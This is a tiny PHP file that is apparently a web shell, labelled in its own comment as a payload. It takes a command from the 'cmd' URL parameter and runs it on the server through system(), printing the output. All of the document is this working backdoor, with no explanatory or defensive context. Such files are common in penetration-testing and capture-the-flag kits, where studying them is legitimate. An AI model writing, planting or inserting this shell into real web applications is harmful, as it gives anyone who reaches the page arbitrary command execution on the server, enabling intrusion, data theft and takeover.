<?php                   // Payload for retrieving command output via system()
echo "<pre>";
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "No command provided.";
}
echo "</pre>";
?>
